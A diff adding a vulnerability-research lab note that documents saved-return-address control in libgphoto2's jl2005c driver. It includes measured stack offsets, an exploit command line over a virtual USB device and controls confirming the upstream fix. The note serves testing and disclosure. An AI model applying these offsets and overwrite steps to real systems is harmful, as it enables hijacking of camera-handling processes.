@@ -1,0 +1,69 @@
+# W191 (2026-11-25 11:5xZ) — chosen saved-RIP target on a FULL clang 18 build of real libgphoto2 2.5.34
+
+Build: clean tarball sha 5df9e774eb4ab6087a193afff84dcaf...f28, source at
+/tmp/w190-clang/libgphoto2-2.5.34, out-of-tree /tmp/w190-clang-build,
+CC=clang, CFLAGS="-O0 -g -fPIC -fno-omit-frame-pointer",
+--with-camlibs=jl2005c --enable-vusb, make install. Vulnerable source hash
+(restored after the fixed control):
+0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185.
+Patches: committed live/vusb-jl2005.patch, evidence/replay-vusb-local-modes.patch
+(p-mode) and evidence/replay-vusb-ret.patch (W191, verified to apply to the
+p-mode-only source). Probe: evidence/replay-clang-control-flow-probe.c,
+clang -O0 -g -no-pie; MARKER is a probe function printing
+M2SHELL_W191_BENIGN_MARKER then _exit(42) — no command is executed.
+
+## Frame measurement (gdb, breakpoint at installed jl2005c_init+1622, real :154 memmove)
+
+Disassembly of installed camlib: `info` rbp-0x4050, `priv` reloaded from
+rbp-0x20, `port` rbp-0x18, `camera` rbp-0x10; no canary. Oversized :152
+read starts at rbp-0x3E30. Reply-offset mapping measured with the device
+bytes themselves:
+
+  M2SHELL_JL2005_VUSB=p M2SHELL_JL2005_COUNT=1022
+  M2SHELL_JL2005_LEN=0x4000 M2SHELL_JL2005_TOP=0x4040f0
+  RBP=0x7fffffffb6f0 privslot=0x4040f0 saved_rbp=0x5a5a5a5a5a5a5a5a saved_rip=0x5a5a5a5a5a5a5a5a
+  0x7fffffffb6d0: 0x00000000004040f0  (TOP landed at rbp-0x20)
+
+  Existing c-mode knob M2SHELL_JL2005_RIP=0x4141414141414141
+  at :154 shows `port=0x4141414141414141`, `priv=0x5a...`,
+  `saved_rip=0x5a...`: reply offset 0x3E38 reaches rbp-0x18, not saved RIP;
+  saved RIP is +0x28 higher, reply offset 0x3E58.
+
+Therefore the W191 vusb RET knob writes device-chosen bytes at reply 0x3E58.
+
+## Attack — device chooses memmove destination and return target
+
+  env CAMLIBS=$P/lib/libgphoto2/2.5.34 IOLIBS=$P/lib/libgphoto2_port/0.12.2 \
+    IOLIBS_PREFIX=vusb LD_LIBRARY_PATH=$P/lib M2SHELL_JL2005_VUSB=p \
+    M2SHELL_JL2005_COUNT=1022 M2SHELL_JL2005_LEN=0x4000 \
+    M2SHELL_JL2005_TOP=0x4040f0 M2SHELL_JL2005_RET=0x401520 /tmp/w191-probe
+  MARKER=0x401520
+  BEFORE SINK=0x4040c0 COUNT_5A=0 FIRST_5A=18446744073709551615 LAST_5A=18446744073709551615
+  M2SHELL_W191_BENIGN_MARKER
+  attack_rc=42
+
+## Negative control — same oversized reply, RET unset
+
+  M2SHELL_JL2005_RET unset: SIGSEGV SINK=0x4040c0 COUNT_5A=16312
+  FIRST_5A=576 LAST_5A=16895, process rc=139 (saved RIP = 0x5a...).
+
+## Safe control — count 100
+
+  gp_camera_init rc=0; AFTER_INIT SINK=0x4040c0 COUNT_5A=0; process rc=0;
+  marker not executed.
+
+## Fixed control — upstream commit 6a3393d applied and camlib rebuilt
+
+  pins/fix-6a3393d.patch applied, make -C build/camlibs jl2005c.la,
+  installed camlib, same attack env: gp_camera_init rc=0, COUNT_5A=0,
+  marker not executed, process rc=0. Fix then reversed, vulnerable source
+  hash restored (above), camlib rebuilt and reinstalled; the identical
+  attack again printed M2SHELL_W191_BENIGN_MARKER and exited 42.
+
+## Grade boundary
+
+Author-side rung 4 only, unwitnessed: chosen control-flow target reached in
+the lab process via a benign probe function; target address is supplied by
+the host environment, transport is synthetic vusb, no physical/wire USB,
+no shell command, no pointer chain to a payload, no witness verdict. Rung 5
+stays UNKNOWN.
